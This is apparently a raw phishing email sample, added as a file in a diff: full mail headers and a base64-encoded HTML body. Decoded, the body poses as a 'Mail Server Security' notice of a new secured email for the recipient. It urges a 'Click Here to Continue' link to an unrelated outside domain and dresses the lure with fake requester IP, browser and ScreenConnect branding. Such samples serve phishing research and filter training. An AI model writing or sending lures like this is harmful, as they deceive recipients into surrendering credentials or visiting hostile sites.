@@ -1,0 +1,147 @@
+Return-Path: jrdcpa@goodbyme.com
+Delivered-To: jose@monkey.org
+X-FDA: 81658563378.08.B5CDE53
+Received: from relayvx12c.securemail.intermedia.net
+ (relayvx12c.securemail.intermedia.net [64.78.52.187])	by
+ imf29.b.hostedemail.com (Postfix) with ESMTP id BF17C120005	for
+ <jose@monkey.org>; Tue,  9 Jan 2024 04:57:06 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=pass (imf29.b.hostedemail.com: domain of jrdcpa@goodbyme.com designates
+ 64.78.52.187 as permitted sender) smtp.mailfrom=jrdcpa@goodbyme.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1704776226;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=zjJ3uOymVlbOJv4tNVGqwFIhi6xbhvW7B+P6uy0LGMc=;
+	b=jQ+2CTWg8RNI32xolaPCi8WO/Chz9dFcpSkiGXH17j/AsUf0dbI+4AEXKATFODU2HgcxpG
+	LAyQQyHSAmQPO9G/IIy3KYK0MWvFDdFYCWWsQSCRg2qZWjJeovDZY+3hurvibB4ytS5tOD
+	D/5vtLm5DMCIC3GoKM652KLONL5waS0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1704776226; a=rsa-sha256;
+	cv=none;
+	b=xzCFh4x2EoH/KBvAq8aFwlKBi3wlUIiJtwVEvZcrC4LMhS1dPW0HO8MdOKzYjf/KS3Rhb7
+	Q8ozWPeW2p0QyQf0cTreR75Yh9C32J5Fvkkre/L4nDYC4JAIntDhExEbMeqeeQXL9B3bej
+	tXEhgEDE3QYkJ1C/5+0ny+3LM5f1SMk=
+ARC-Authentication-Results: i=1;	imf29.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=pass (imf29.b.hostedemail.com: domain of jrdcpa@goodbyme.com
+ designates 64.78.52.187 as permitted sender)
+ smtp.mailfrom=jrdcpa@goodbyme.com
+Received: from relayvx11a.securemail.intermedia.net (localhost [127.0.0.1])
+	by emg-ca-1-2.localdomain (Postfix) with ESMTP id DB742602AE
+	for <jose@monkey.org>; Mon,  8 Jan 2024 20:57:05 -0800 (PST)
+Subject: ATTN: E-File Received
+MIME-Version: 1.0
+x-echoworx-msg-id: aebed7e8-e92a-40d1-b6c9-51be49ce7e8e
+x-echoworx-emg-received: Mon, 8 Jan 2024 20:57:05.842 -0800
+x-echoworx-spool-arrive-time: Mon, 8 Jan 2024 20:57:05.832 -0800
+x-echoworx-message-code-hashed:
+ 698eb818a7255c52c97296523105bf1f2aaeb3c6a95cf4f916a96c08c63a5384
+x-echoworx-action: delivered
+Received: from emg-aesoc-ca-1-1.securemail.intermedia.net ([10.254.97.41])
+          by emg-ca-1-2 (JAMES SMTP Server 2.3.2.1) with SMTP ID 84
+          for <jose@monkey.org>;
+          Mon, 8 Jan 2024 20:57:05 -0800 (PST)
+Received: from relayvx12c.securemail.intermedia.net
+ (relayvx12c.securemail.intermedia.net [64.78.52.187])
+	by emg-aesomt-ca-1-2.localdomain (Postfix) with ESMTP id 88D7520003
+	for <jose@monkey.org>; Mon,  8 Jan 2024 20:57:05 -0800 (PST)
+Received: from MBX081-W9-CO-1.exch081.serverpod.net (unknown [10.224.129.160])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by emg-ca-1-2.localdomain (Postfix) with ESMTPS id 72198602C7
+	for <jose@monkey.org>; Mon,  8 Jan 2024 20:57:05 -0800 (PST)
+Received: from 147.189.174.51 (147.189.174.51) by
+ MBX081-W7-CO-2.exch081.serverpod.net (10.224.129.138) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1258.28; Mon, 8 Jan 2024 20:56:01 -0800
+Date: Tue, 9 Jan 2024 04:56:01 +0000
+To: <jose@monkey.org>
+From: Mail Server_ Security <jrdcpa@goodbyme.com>
+Message-ID: <0906e3b43362cd34010bf279e22acfb9@goodbyme.com>
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: base64
+X-Originating-IP: [147.189.174.51]
+X-ClientProxiedBy: MBX081-W9-CO-2.exch081.serverpod.net (10.224.129.162) To
+ MBX081-W7-CO-2.exch081.serverpod.net (10.224.129.138)
+X-Source-Routing-Agent: True
+Spam-Stopper-Id: eb87bdc1-d636-47d0-9b36-e89319bf874e
+Spam-Stopper-v2: Yes
+X-Envelope-Mail-From: jrdcpa@goodbyme.com
+X-Spam-Category: LEGIT
+X-Spam-Reasons: {'verdict': 'clean', 'spamcause': =?utf-8?q?=27gggruggvucftv?=
+ =?utf-8?q?ghtrhhoucdtuddrgedvkedrvdehkedgjeejucetufdoteggodetrfdotffvucfrrh?=
+ =?utf-8?q?hofhhilhgvmecukffpvffgtffogfffkfetpdfqfgfvnecuuegrihhlohhuthemuce?=
+ =?utf-8?q?ftddtnecunecujfgurhepfffvhffukfggtgfgiheshhgsjhdttddtjeenucfhrhho?=
+ =?utf-8?q?mhepofgrihhlucfuvghrvhgvrhgpucfuvggtuhhrihhthicuoehjrhgutghprgesg?=
+ =?utf-8?q?hhoohgusgihmhgvrdgtohhmqeenucggtffrrghtthgvrhhnpeelteeljeevhefhle?=
+ =?utf-8?q?duhedtvdfhtdevfffgkedtveeiheektdfgveefgfeileeiffenucffohhmrghinhe?=
+ =?utf-8?q?pmhhonhhkvgihrdhorhhgpdhtshhmsggrnhhgkhhokhdrtghomhenucfkphepudeg?=
+ =?utf-8?q?jedrudekledrudejgedrhedunecuvehluhhsthgvrhfuihiivgeptdenucfrrghrr?=
+ =?utf-8?q?ghmpehinhgvtheppfhonhgvpdhmrghilhhfrhhomhepjhhruggtphgrsehgohhoug?=
+ =?utf-8?q?gshihmvgdrtghomhdpnhgspghrtghpthhtohepuddprhgtphhtthhopehjohhsvge?=
+ =?utf-8?q?smhhonhhkvgihrdhorhhgpdgruhhthhgpuhhsvghrpehjrhgutghprgesghhoohgu?=
+ =?utf-8?q?sgihmhgvrdgtohhm=27=2C?= 'elapsed': '15ms'}
+X-AES-Category: LEGIT
+X-Spam-Score: 0
+X-Rspamd-Server: rspam02
+X-Rspam-User: 
+X-Rspamd-Queue-Id: BF17C120005
+X-Spam-Status: No, score=2.10
+X-Stat-Signature: ji79yyk7x81xgf9s998r1bez59ucmks1
+X-CMAE-Score: 0
+X-CMAE-Analysis: v=2.4 cv=LoeUyGdc c=1 sm=1 tr=0 ts=659cd223
+	a=5G0zfsGD6TV4z0+q0BE8Ig==:117 a=5G0zfsGD6TV4z0+q0BE8Ig==:17
+	a=0a+5RmTQVyRWvIRO2U5pMylF9Pg=:19 a=afCUQMFxEcAA:10 a=IkcTkHD0fZMA:10
+	a=dEuoMetlWLkA:10 a=T-PJXEmqAAAA:8 a=Qdb1w-9KAAAA:8
+	a=5k5Pqnas-miXavos99QA:9 a=B7tnI7afYV_f4ZcU:21 a=QEXdDO2ut3YA:10
+	a=Vw4nTgcmXu8A:10 a=TLMVSm3AIi2ufbynrBM0:22 a=d6xU-8Wnbi0N4PW-wyy0:22
+X-HE-Tag: 1704776226-489446
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/HOKtap0+YLsYDpVHjOd8lRfuaznpSX4dn6H+S46AX9DO?=
+ =?utf-8?q?ENzmxlVlg9nuV6dCfrq5t/t1kJ5+73ylz6z5HNolJyocrqXUfZF0lCvLeXuFEIwPu?=
+ =?utf-8?q?yFnFkHPkaYJlXHX2Rn/vac5U70EGWcNriMjCJ+Nsv29evbHync3NvU0B1ieXKshi1?=
+ =?utf-8?q?FRlRowBY85TQKLl9cLQVVrqvbDmQebhiYXrWBRpBdIQ03/7qu/LesYaS6PghaPAM7?=
+ =?utf-8?q?6/frCDvtTZSDYj+Er4K0Qo/LUhim4HKnoIEhHi58z5wkvcoJICHb9gEohEdA7qgxI?=
+ =?utf-8?q?1DkbpGj+MXBG4884jajGvZ8rxZNfNdpaetzeWHvIkPKO3edHgzszk8e4gVRHv8YwX?=
+ =?utf-8?q?3Y2nMlH5tE/yi9OZWJmbeHb6c5c6AMzmXm6rt0Mi2/aetCcbaV1kLNobn2u8bKkw2?=
+ =?utf-8?q?R02xgGHr5+PLpse0qRBTpWWwQqAkR2xZvySInDv+rlGE0a+Lv6wBbmfvnR7hu6ldW?=
+ =?utf-8?q?/tzjvbDMj+VJCdmVPnI1LGS9kjengwk38ix+fSjdRby/W/qzp2tZr6H5KnRZZBXCa?=
+ =?utf-8?q?PxDIRpU+mBrQFLgxgvE5vKP3B/n1D8OmsCdksc4+Q6ICG7zKiyEf24N9wi2ZcSIZ2?=
+ =?utf-8?q?bI1L0xG+qbPGhtzf9DfYQhbfVtjZCzPLL5a22bwFEf5hOByJIB/+1Uu9R9vQ4FrV3?=
+ =?utf-8?q?GkEb489xquE+y9c8ASOV0DptK5xKKmd3xOpELCcHDtpk/gIvfV+hRGkWsbCRE5Og4?=
+ =?utf-8?q?ZWg0XEywuMS7TcOwE18o29ySTNPiG3wL9hLnJyYVtgLgsAc49vX1Y9ECmb1N2cGk2?=
+ =?utf-8?q?RqjFFKn9m4202AAFXCeqYGuyqvBmjNeCJUeA+8U3sRVGRXKCC6kLgNVijSHGEEypf?=
+ =?utf-8?q?T6yxeQQP5sZxrKldPrTKP+KgNJi0uiGs2cWniKTNxw0hn+LgnDuLnXwhGD940RcoS?=
+ =?utf-8?q?PnqCG/JIyOF2BPWFWrIvWf_L7LsqvRzfyb9DSW1yUHHb2BvJjS1UfkX6Fl13FiSsv?=
+ =?utf-8?q?diYl7+TaMvmULy7WuXl4/2V+/hwJ1qhcn2q6K2DZe6EfX8Mqg=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 13
+
+PHRhYmxlPjx0Ym9keT48dHI+PHRkIHN0eWxlPSJ3aWR0aDo1MDBweDtiYWNrZ3JvdW5kLWNvbG9y
+OiM1NTU7bWFyZ2luOjAgYXV0bzsiPjxwIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MTRweDts
+aW5lLWhlaWdodDoxN3B4O3RleHQtYWxpZ246Y2VudGVyO3BhZGRpbmc6MTBweCAxNXB4OyI+PHNw
+YW4gc3R5bGU9ImZvbnQtc2l6ZToxOHB4O2xpbmUtaGVpZ2h0OjE4cHg7Y29sb3I6I2ZmZjsiPjxi
+ci8+TmV3IFNlY3VyZWQgRW1haWwgZm9yIGpvc2VAbW9ua2V5Lm9yZyBmcm9tIE1vbmtleS5vcmc8
+L3NwYW4+PC9wPjxwIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MTRweDtsaW5lLWhlaWdodDox
+N3B4O3RleHQtYWxpZ246Y2VudGVyO3BhZGRpbmc6MTBweCAxNXB4OyI+Jm5ic3A7Jm5ic3A7PC9w
+PjxwIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MTRweDtsaW5lLWhlaWdodDoxN3B4O3RleHQt
+YWxpZ246Y2VudGVyO3BhZGRpbmc6MTBweCAxNXB4OyI+Jm5ic3A7PC9wPjxjZW50ZXI+PGEgc3R5
+bGU9ImJhY2tncm91bmQtY29sb3I6YmxhY2s7Y29sb3I6d2hpdGU7dGV4dC1kZWNvcmF0aW9uOm5v
+bmU7cGFkZGluZzoxMnB4O2JvcmRlci1yYWRpdXM6MnB4OyJocmVmPSJodHRwczovL3RzbWJhbmdr
+b2suY29tLyI+Q2xpY2sgSGVyZSB0byBDb250aW51ZTwvYT48L2NlbnRlcj48YnIvPjxici8+PC90
+ZD48L3RyPjx0cj48dGQgc3R5bGU9IndpZHRoOjUwMHB4O21hcmdpbjowO2JhY2tncm91bmQtY29s
+b3I6I2YwZjBmMDtwYWRkaW5nOjQwcHg7Ij48ZGl2IHN0eWxlPSJmb250LXNpemU6MTJweDtsaW5l
+LWhlaWdodDoxOHB4O2NvbG9yOiM5NTk1OTU7Zm9udC1mYW1pbHk6QXJpYWwsJ0hlbHZldGljYSBO
+ZXVlJyxIZWx2ZXRpY2Esc2Fucy1zZXJpZixzZXJpZixFbW9qaUZvbnQ7Ij48cCBzdHlsZT0ibWFy
+Z2luOjA7Zm9udC1zaXplOjE0cHg7bGluZS1oZWlnaHQ6MjFweDt0ZXh0LWFsaWduOmNlbnRlcjsi
+PnZydDo1dDV0NDUtNTkzMjMtNTk1NTkgVmFsaWQgZm9yOiAxMCBtaW4gUmVxdWVzdGVyIElQIGFk
+ZHJlc3M6IDY1LjExOC42NS4xMCBSZXF1ZXN0ZXIgdXNlciBhZ2VudDogTW96aWxsYS81LjAgKFdp
+bmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlr
+ZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjAuMC4wLjA8L3A+
+PHAgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxNHB4O2xpbmUtaGVpZ2h0OjIxcHg7dGV4dC1h
+bGlnbjpjZW50ZXI7Ij5Qb3dlcmVkIGJ5Jm5ic3A7PHN0cm9uZz5Db25uZWN0V2lzZSBTY3JlZW5D
+b25uZWN0Jm5ic3A7PHN1cD5UTTwvc3VwPjwvc3Ryb25nPi48L3A+PC9kaXY+PC90ZD48L3RyPjwv
+dGJvZHk+PC90YWJsZT4=
+
